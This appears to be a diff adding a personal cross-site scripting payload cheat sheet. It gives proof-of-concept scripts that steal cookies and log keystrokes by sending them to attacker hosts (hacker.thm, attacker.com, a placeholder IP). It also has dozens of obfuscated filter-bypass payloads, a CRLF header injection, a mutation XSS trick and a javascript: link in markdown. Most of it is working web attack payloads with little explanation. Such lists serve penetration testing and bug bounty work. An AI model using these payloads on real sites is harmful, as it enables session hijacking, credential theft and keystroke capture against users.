@@ -1,0 +1,129 @@
+Content-Type: text/html
+Content-Type: application/javascript
+Content-Type: application/ecmascript
+Content-Type: text/jsx
+
+text/html
+application/javascript
+application/ecmascript
+application/x-ecmascript
+application/xhtml+xml
+text/javascript
+text/ecmascript
+text/jsx
+image/svg+xml
+
+
+----------------------------------POCS--------------------------------------
+
+Session Stealing:
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+<script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+
+
+Key Logger:
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+
+
+
+
+
+
+https://www.crackcodes.in/2023/06/advanced-cross-site-scripting-xss.html
+
+onload="javascript:myFunction('/profile/console.log(false||prompt(1))"
+
+onload="javascript:myFunction('/profile/void''??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],))"
+
+alert ?. ()   
+
+javascript:{ alert`0` }
+
+1'"><img/src/onerror=.1|alert``>
+
+!!alert()
+~alert()
+(alert())
+[alert()]
+someString"-alert(1)-"someString
+
+1"><Svg Only=1 OnLoad=confirm(document.domain)>
+
+<svg onload=alert%26%230000000040"1")>
+
+%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+
+(É=[Å=[],μ=!Å+Å][μ[È=-~-~++Å]+({}+Å) [Ç=!!Å
++μ,ª=Ç[Å]+Ç[+!Å],Å]+ª])() [μ[Å]+μ[Å+Å]+Ç[È]+ª](Å)
+
+($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''
++$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)
+
+%E5%98%8D%E5%98%8ASet-Cookie:crlf=in
+
+
+<option><style></option></select><img src=x onerror=alert(1)></style>
+
+#jaVasCript:/*-/*`/*\\`/*\'/*\"/**/(/* */onCliCk=alert('BOOM') ' ')//%0D%0A%0d%0a//</sTyle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()>\\x3e">
+
+
+https://m.olx.ph/all-results?q=0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg" HTTP-EQUIV="refresh" a="a
+
+‘ onfocus=’alert(1)’
+
+<<img <<img<src=x<img src="x" onerror="alert('XSS')" /<<>img src=x onerror=alert()/>
+
+＜img src="x" onerror="alert('XSS')" /﹥
+
+d1bvs%3c%2fscript%3e%3cscript%3ealert(`XSS`)%3c%2fscript%3ec579g
+
+%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%29
+
+%2sscript%2ualert()%2s/script%2u
+
+<--<img/src=%20onerror=confirm``>%20--!>
+
+/login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+
+"><i><<i></i>i>hello<</i>/i>
+
+https://hackerone.com/reports/526325
+
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+
+
+"><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>
+
+
+<img src=x onerror=alert(999)<!--
+
+<img src=no onerror=alert(1) foo=<div>example</div>
+
+Blind XSS:
+
+<script src="http://attacker.com/xss.js"></script>
+
+<button popovertarget=x>Click me</button>
+
+<xss onbeforetoggle=alert(1) popover id=x>XSS</xss>
+
+
+
+Because < and > are encoded, ending the anchor tag and adding a new tag won't work. However, if " quotation marks aren't encoded or filtered out, you can definitely still get XSS. For example, example.com/"+onclick="alert('XSS!') as a URL input will generate the output <a href="http://example.com/" onclick="alert('XSS!')" target="_blank">.
+
+
+
+
+
+
+
+
+
+
+
+----------------Mark Down - File Upload ----------------------
+
+
+ $$ \href{javascript:alert(1)}{Click Me!} $$ 
